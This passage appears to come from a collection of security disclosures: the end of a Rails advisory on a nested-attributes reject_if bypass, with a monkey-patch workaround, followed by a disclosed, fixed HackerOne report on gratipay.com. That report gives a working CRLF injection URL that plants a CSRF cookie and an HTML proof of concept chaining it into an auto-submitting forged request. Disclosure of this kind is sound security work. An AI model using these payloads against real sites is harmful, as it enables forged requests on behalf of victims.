being called because it assumes that the record will be destroyed anyway.

However this isn't true if `:allow_destroy` is false so this leads to changes
that would have been rejected being applied to the record. Attackers could use
this do things like set attributes to invalid values and to clear all of the
attributes amongst other things. The severity will be dependent on how the
application has used this feature.

All users running an affected release should either upgrade or use one of
the workarounds immediately.

Releases
--------
The FIXED releases are available at the normal locations.

Workarounds
-----------
If you can't upgrade, please use the following monkey patch in an initializer
that is loaded before your application:

```
$ cat config/initializers/nested_attributes_bypass_fix.rb
module ActiveRecord
  module NestedAttributes
    private

    def reject_new_record?(association_name, attributes)
      will_be_destroyed?(association_name, attributes) || call_reject_if(association_name, attributes)
    end

    def call_reject_if(association_name, attributes)
      return false if will_be_destroyed?(association_name, attributes)

      case callback = self.nested_attributes_options[association_name][:reject_if]
      when Symbol
        method(callback).arity == 0 ? send(callback) : send(callback, attributes)
      when Proc
        callback.call(attributes)
      end
    end

    def will_be_destroyed?(association_name, attributes)
      allow_destroy?(association_name) && has_destroy_flag?(attributes)
    end

    def allow_destroy?(association_name)
      self.nested_attributes_options[association_name][:allow_destroy]
    end
  end
end
```

Patches
-------
To aid users who aren't able to upgrade immediately we have provided patches for
the two supported release series. They are in git-am format and consist of a
single changeset.

* 3-2-nested-attributes-reject-if-bypass.patch - Patch for 3.2 series
* 4-1-nested-attributes-reject-if-bypass.patch - Patch for 4.1 series
* 4-2-nested-attributes-reject-if-bypass.patch - Patch for 4.2 series
* 5-0-nested-attributes-reject-if-bypass.patch - Patch for 5.0 series

Please note that only the 4.1.x and 4.2.x series are supported at present. Users
of earlier unsupported releases are advised to upgrade as soon as possible as we
cannot guarantee the continued availability of security fixes for unsupported
releases.

Credits
-------
Thank you to Justin Coyne for reporting the problem and working with us to fix it.

[1]: https://github.com/rails/rails/commit/a9b4b5da7c216e4464eeb9dbd0a39ea258d64325

---

### [[gratipay.com] CRLF Injection](https://hackerone.com/reports/79552)

- **Report ID:** `79552`
- **Severity:** High
- **Weakness:** Uncategorized
- **Program:** Gratipay
- **Reporter:** @bobrov
- **Bounty:** 40 usd
- **Disclosed:** 2015-08-20T10:24:29.252Z
- **CVE(s):** -

**Vulnerability Information:**

### CRLF Injection 
(Chrome, Internet Explorer)
```
http://gratipay.com/%0dSet-Cookie:csrf_token=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
```

HTTP Response:
```
Location: https://gratipay.com/\r
Set-Cookie:csrf_token=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;\r\n
```

### CSRF Protection Bypass via CRLF Injection
PoC:
```html
<form id="csrf" action="https://gratipay.com/~fickov/statement.json" method="POST"> 
<input type="hidden" name="lang" value="en" /> 
<input type="hidden" name="content" value="CSRF&#95;TEST" /> 
<input type="hidden" name="csrf&#95;token" value="xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx" /> 
<input type="submit" value="Submit request" /> 
</form> 
<img src="http://gratipay.com/%0dSet-Cookie:csrf_token=xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;" onerror="csrf.submit()">
```

This vulnerability has been fixed.

---
